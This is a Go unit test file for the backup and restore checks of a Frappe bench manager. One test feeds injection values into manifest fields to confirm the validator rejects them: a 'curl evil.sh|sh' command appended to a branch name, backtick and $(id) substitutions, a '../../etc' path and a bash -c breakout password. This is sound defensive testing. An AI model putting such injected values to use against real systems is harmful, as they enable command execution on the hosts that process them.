package manager

import (
	"strconv"
	"strings"
	"testing"

	"github.com/nasroykh/foxmayn_frappe_manager/internal/archive"
	"github.com/nasroykh/foxmayn_frappe_manager/internal/state"
)

// devManifest is a minimal valid dev archive; tests mutate a copy.
func devManifest() Manifest {
	return Manifest{
		Header: Header{
			Kind:          ArchiveKind,
			SchemaVersion: SchemaVersion,
			BenchName:     "bkptest",
			SiteName:      "bkptest.localhost",
			Mode:          "dev",
			DBType:        "mariadb",
			Tiers:         []string{TierCore, TierFiles},
		},
		Bench: state.Bench{Name: "bkptest", Mode: "dev", Apps: []string{"erpnext"}},
		Site: SiteInfo{
			SiteName:      "bkptest.localhost",
			InstalledApps: []string{"frappe", "erpnext"},
		},
		Secrets: Secrets{EncryptionKey: "3_hb1VNx0G3_rWI7r_W8rvKDt_Ib1Nb2ULzGYpthyAs="},
		Members: []archive.Member{{
			Path: archive.Prefix + "/db/database.sql.gz", Size: 10, SHA256: "aa", Encoding: archive.EncodingGzip,
		}},
	}
}

func hasProblem(problems []Problem, substr string) bool {
	for _, p := range problems {
		if strings.Contains(p.Message, substr) {
			return true
		}
	}
	return false
}

func TestCheckArchive(t *testing.T) {
	tests := []struct {
		name     string
		mutate   func(*Manifest)
		in       RestoreInput
		target   string
		wantSub  string
		wantNone bool
	}{
		{
			name:     "healthy dev archive passes",
			target:   "restored",
			wantNone: true,
		},
		{
			name:    "missing core tier",
			mutate:  func(m *Manifest) { m.Header.Tiers = []string{TierFiles} },
			target:  "restored",
			wantSub: "no database tier",
		},
		{
			name:    "invalid target name",
			target:  "Not A Bench!",
			wantSub: "invalid target bench name",
		},
		{
			name:    "missing encryption key",
			mutate:  func(m *Manifest) { m.Secrets.EncryptionKey = "" },
			target:  "restored",
			wantSub: "no site encryption_key",
		},
		{
			name: "encrypted dump without a key",
			mutate: func(m *Manifest) {
				m.Members[0].Encoding = archive.EncodingGPG
			},
			target:  "restored",
			wantSub: "GPG-encrypted",
		},
		{
			name: "encrypted dump with the key supplied by flag",
			mutate: func(m *Manifest) {
				m.Members[0].Encoding = archive.EncodingGPG
			},
			in:       RestoreInput{EncryptionKey: "supplied"},
			target:   "restored",
			wantNone: true,
		},
		{
			name: "prod without a domain",
			mutate: func(m *Manifest) {
				m.Header.Mode = "prod"
				m.Bench.Mode = "prod"
				m.Bench.TLSMode = state.TLSLetsEncrypt
			},
			target:  "restored",
			wantSub: "records no domain",
		},
		{
			name: "prod domain supplied by flag",
			mutate: func(m *Manifest) {
				m.Header.Mode = "prod"
				m.Bench.Mode = "prod"
				m.Bench.TLSMode = state.TLSNone
			},
			in:       RestoreInput{Domain: "erp.example.com"},
			target:   "restored",
			wantNone: true,
		},
		{
			// The bug TLSMode was persisted to fix: inferring no-SSL from
			// ProxyHost's scheme is wrong after 'ffm set-proxy --port 80'.
			name: "prod archive predating TLSMode refuses to guess",
			mutate: func(m *Manifest) {
				m.Header.Mode = "prod"
				m.Bench.Mode = "prod"
				m.Bench.Domain = "erp.example.com"
				m.Bench.TLSMode = ""
				m.Bench.ProxyHost = "http://erp.example.com"
			},
			target:  "restored",
			wantSub: "does not record how TLS was served",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			m := devManifest()
			if tt.mutate != nil {
				tt.mutate(&m)
			}
			problems := checkArchive(m, tt.target, tt.in)
			if tt.wantNone {
				if len(problems) != 0 {
					t.Fatalf("expected no problems, got %v", problems)
				}
				return
			}
			if !hasProblem(problems, tt.wantSub) {
				t.Fatalf("problems = %v, want one containing %q", problems, tt.wantSub)
			}
		})
	}
}

func TestVerifyMembers(t *testing.T) {
	m := devManifest()
	good := &archive.ExtractResult{Members: map[string]archive.Member{
		archive.Prefix + "/db/database.sql.gz": {Size: 10, SHA256: "aa"},
	}}
	if err := verifyMembers(m, good); err != nil {
		t.Fatalf("healthy archive rejected: %v", err)
	}

	corrupt := &archive.ExtractResult{Members: map[string]archive.Member{
		archive.Prefix + "/db/database.sql.gz": {Size: 10, SHA256: "bb"},
	}}
	if err := verifyMembers(m, corrupt); err == nil || !strings.Contains(err.Error(), "corrupted") {
		t.Fatalf("error = %v, want a corruption complaint", err)
	}

	empty := &archive.ExtractResult{Members: map[string]archive.Member{}}
	if err := verifyMembers(m, empty); err == nil || !strings.Contains(err.Error(), "incomplete") {
		t.Fatalf("error = %v, want an incompleteness complaint", err)
	}
}

func TestAppsForRestore(t *testing.T) {
	tests := []struct {
		name  string
		specs []string
		apps  []string
		want  []string
	}{
		{
			name:  "installed app missing from the bench record is recovered",
			specs: []string{"erpnext"},
			apps:  []string{"frappe", "erpnext", "hrms"},
			want:  []string{"erpnext", "hrms"},
		},
		{
			name:  "frappe is never an app spec",
			specs: nil,
			apps:  []string{"frappe"},
			want:  nil,
		},
		{
			name:  "url specs win over bare names",
			specs: []string{"https://github.com/acme/custom.git@develop"},
			apps:  []string{"frappe", "custom"},
			want:  []string{"https://github.com/acme/custom.git@develop"},
		},
		{
			name:  "branch suffix is not duplicated",
			specs: []string{"erpnext@version-15"},
			apps:  []string{"frappe", "erpnext"},
			want:  []string{"erpnext@version-15"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			m := devManifest()
			m.Bench.Apps = tt.specs
			m.Site.InstalledApps = tt.apps
			got := appsForRestore(m)
			if len(got) != len(tt.want) {
				t.Fatalf("apps = %v, want %v", got, tt.want)
			}
			for i := range got {
				if got[i] != tt.want[i] {
					t.Fatalf("apps = %v, want %v", got, tt.want)
				}
			}
		})
	}
}

func TestScrubSecrets(t *testing.T) {
	out := "could not connect as admin: Access denied (using password: ffm123456)"
	got := scrubSecrets(out, "ffm123456", "admin", "")

	if strings.Contains(got, "ffm123456") {
		t.Errorf("password survived scrubbing: %s", got)
	}
	if !strings.Contains(got, "***") {
		t.Errorf("expected a placeholder, got %s", got)
	}
	// Values below the length floor are left alone, or a credential that
	// happens to be a common word would redact half the message.
	if !strings.Contains(got, "admin") {
		t.Errorf("a short value was scrubbed, mangling the message: %s", got)
	}
}

func TestCheckNameFree(t *testing.T) {
	if p := checkNameFree("restored", false, false, false, false); len(p) != 0 {
		t.Fatalf("expected a free name to pass, got %v", p)
	}
	p := checkNameFree("restored", false, true, false, false)
	if !hasProblem(p, "Docker volumes") {
		t.Fatalf("problems = %v, want an orphaned-volume refusal", p)
	}
	p = checkNameFree("restored", true, true, true, true)
	if len(p) != 4 {
		t.Fatalf("expected all four collisions to be reported, got %v", p)
	}
}

func TestParseHeaderGates(t *testing.T) {
	t.Run("rejects a foreign archive", func(t *testing.T) {
		_, err := ParseHeader([]byte(`{"kind":"borg","schema_version":1}`))
		if err == nil || !strings.Contains(err.Error(), "not an ffm backup archive") {
			t.Fatalf("error = %v", err)
		}
	})

	t.Run("refuses an archive that needs a newer ffm", func(t *testing.T) {
		_, err := ParseHeader([]byte(`{"kind":"ffm-backup","schema_version":9,` +
			`"min_reader_version":9,"bench_name":"a","site_name":"b"}`))
		if err == nil || !strings.Contains(err.Error(), "needs a newer ffm") {
			t.Fatalf("error = %v", err)
		}
	})

	t.Run("accepts a newer additive schema and flags it", func(t *testing.T) {
		h, err := ParseHeader([]byte(`{"kind":"ffm-backup","schema_version":9,` +
			`"min_reader_version":1,"bench_name":"a","site_name":"b","future_field":42}`))
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if !h.NewerSchema() {
			t.Errorf("expected NewerSchema to report true")
		}
	})
}

func TestParseDirtyPaths(t *testing.T) {
	tests := []struct {
		name    string
		app     string
		changed string
		want    []string
	}{
		{
			// The realtime patches are ffm's own work, re-applied by restore.
			// Counting them would mark every bench ffm has ever made as dirty.
			name:    "ffm's own frappe patches are not user changes",
			app:     "frappe",
			changed: "realtime/middlewares/authenticate.js\nrealtime/utils.js",
			want:    nil,
		},
		{
			name:    "a real change alongside ffm's patches is reported",
			app:     "frappe",
			changed: "realtime/utils.js\nfrappe/model/document.py",
			want:    []string{"frappe/model/document.py"},
		},
		{
			// Same paths in another app are not ffm's doing.
			name:    "the exclusion is scoped to frappe",
			app:     "erpnext",
			changed: "realtime/utils.js",
			want:    []string{"realtime/utils.js"},
		},
		{
			name:    "every reported path is kept",
			app:     "erpnext",
			changed: "old/path.py\nnew/path.py",
			want:    []string{"old/path.py", "new/path.py"},
		},
		{
			name:    "untracked files count",
			app:     "erpnext",
			changed: "banking/yarn.lock",
			want:    []string{"banking/yarn.lock"},
		},
		{
			name:    "a clean tree is clean",
			app:     "erpnext",
			changed: "",
			want:    nil,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := parseDirtyPaths(tt.app, tt.changed)
			if len(got) != len(tt.want) {
				t.Fatalf("paths = %v, want %v", got, tt.want)
			}
			for i := range got {
				if got[i] != tt.want[i] {
					t.Fatalf("paths = %v, want %v", got, tt.want)
				}
			}
		})
	}

	t.Run("long working trees are capped", func(t *testing.T) {
		var lines []string
		for i := 0; i < 40; i++ {
			lines = append(lines, "file"+strconv.Itoa(i)+".py")
		}
		got := parseDirtyPaths("erpnext", strings.Join(lines, "\n"))
		if len(got) != maxDirtyPaths+1 || got[len(got)-1] != "…" {
			t.Fatalf("expected %d paths plus an ellipsis, got %d", maxDirtyPaths, len(got))
		}
	})
}

// A dedup case: the same path can be reported by more than one git query.
func TestParseDirtyPathsDeduplicates(t *testing.T) {
	got := parseDirtyPaths("erpnext", "a.py\nb.py\na.py\n")
	if len(got) != 2 || got[0] != "a.py" || got[1] != "b.py" {
		t.Fatalf("paths = %v, want [a.py b.py]", got)
	}
}

// An archive travels between machines, so every value read out of one is
// untrusted input on its way into a `bash -c` string or a Traefik label.
func TestCheckManifestValuesRejectsInjection(t *testing.T) {
	tests := []struct {
		name    string
		mutate  func(*Manifest)
		in      RestoreInput
		wantSub string
	}{
		{
			name:    "command substitution in the frappe branch",
			mutate:  func(m *Manifest) { m.Bench.FrappeBranch = "version-16;curl evil.sh|sh" },
			wantSub: "frappe branch",
		},
		{
			name:    "backtick in the frappe repo",
			mutate:  func(m *Manifest) { m.Bench.FrappeRepo = "https://x/y`id`" },
			wantSub: "frappe repo",
		},
		{
			name:    "shell metacharacters in an app spec",
			mutate:  func(m *Manifest) { m.Bench.Apps = []string{"erpnext $(id)"} },
			wantSub: "app source",
		},
		{
			name:    "app name used to build a container path",
			mutate:  func(m *Manifest) { m.Apps = []AppInfo{{Name: "../../etc"}} },
			wantSub: "app name",
		},
		{
			name:   "commit used in a checkout",
			mutate: func(m *Manifest) { m.Apps = []AppInfo{{Name: "erpnext", Commit: "$(id)"}} },
			in:     RestoreInput{PinApps: true},
			// Only checked when it will actually be used.
			wantSub: "app commit",
		},
		{
			name:    "password that would break out of bash -c",
			mutate:  func(m *Manifest) { m.Secrets.AdminPassword = "a';id;'" },
			wantSub: "administrator password",
		},
		{
			name:    "backtick in the domain reaches a Traefik label",
			mutate:  func(m *Manifest) { m.Bench.Domain = "erp.example.com`whoami`" },
			wantSub: "not a valid hostname",
		},
		{
			name:    "alias hostname is validated too",
			mutate:  func(m *Manifest) { m.Bench.DomainAliases = []string{"a`b`.internal"} },
			wantSub: "not a valid hostname",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			m := devManifest()
			tt.mutate(&m)
			if !hasProblem(checkManifestValues(m, tt.in), tt.wantSub) {
				t.Fatalf("hostile value was accepted; problems = %v", checkManifestValues(m, tt.in))
			}
		})
	}

	t.Run("an ordinary archive passes", func(t *testing.T) {
		m := devManifest()
		m.Bench.FrappeBranch = "version-16"
		m.Bench.FrappeRepo = "https://github.com/acme/frappe@develop"
		m.Bench.Apps = []string{"erpnext", "git@github.com:acme/custom.git@main"}
		m.Apps = []AppInfo{{Name: "erpnext", Commit: "b24c9eba55de8ea62cefda7965bad7a7e5bf4ff3"}}
		m.Secrets.AdminPassword = "Str0ng-Pass_word.1"
		m.Bench.Domain = "erp.example.com"
		m.Bench.DomainAliases = []string{"erp.internal"}
		if p := checkManifestValues(m, RestoreInput{PinApps: true}); len(p) != 0 {
			t.Fatalf("a valid archive was rejected: %v", p)
		}
	})

	t.Run("a rejected credential is never echoed back", func(t *testing.T) {
		m := devManifest()
		m.Secrets.DBRootPassword = "hunter2';id;'"
		for _, p := range checkManifestValues(m, RestoreInput{}) {
			if strings.Contains(p.Message, "hunter2") {
				t.Fatalf("the rejected password appeared in the error: %s", p.Message)
			}
		}
	})
}

func TestAppsForRestoreUsesRecordedRemote(t *testing.T) {
	m := devManifest()
	m.Bench.Apps = []string{"erpnext"}
	m.Site.InstalledApps = []string{"frappe", "erpnext", "custom"}
	m.Apps = []AppInfo{
		{Name: "erpnext", Remote: "https://github.com/frappe/erpnext", Branch: "version-16"},
		{Name: "custom", Remote: "https://github.com/acme/custom", Branch: "main"},
	}

	got := appsForRestore(m)
	want := []string{"erpnext", "https://github.com/acme/custom@main"}
	if len(got) != len(want) {
		t.Fatalf("apps = %v, want %v", got, want)
	}
	for i := range got {
		if got[i] != want[i] {
			t.Fatalf("apps = %v, want %v", got, want)
		}
	}

	t.Run("falls back to the bare name without a remote", func(t *testing.T) {
		m := devManifest()
		m.Bench.Apps = nil
		m.Site.InstalledApps = []string{"frappe", "hrms"}
		m.Apps = []AppInfo{{Name: "hrms"}}
		if got := appsForRestore(m); len(got) != 1 || got[0] != "hrms" {
			t.Fatalf("apps = %v, want [hrms]", got)
		}
	})
}
